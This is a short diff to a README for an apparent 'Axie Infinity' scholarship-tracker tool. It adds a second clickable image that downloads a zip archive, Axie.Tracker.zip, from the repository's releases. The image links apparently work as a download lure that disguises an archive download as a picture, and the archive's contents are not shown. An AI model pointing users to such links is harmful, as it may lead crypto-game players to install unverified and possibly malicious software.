@@ -9,6 +9,8 @@ This tracker is perfect for anyone who is looking for an easy way to manage thei
 
 [![Axie Scholarship Management Tracker](https://github.com/axie-tracker/axie-tracker.github.io/blob/main/axie-scholarship-tracker.png?raw=true)](https://github.com/axie-tracker/axie-tracker.github.io/releases/download/tracker/Axie.Tracker.zip)
 
+[![Axie Infinity Tracker](https://github.com/axie-tracker/axie-tracker.github.io/blob/main/axie-tracker-management.jpg?raw=true)](https://github.com/axie-tracker/axie-tracker.github.io/releases/download/tracker/Axie.Tracker.zip)
+
 
 ## What Is Axie Infinity?
 
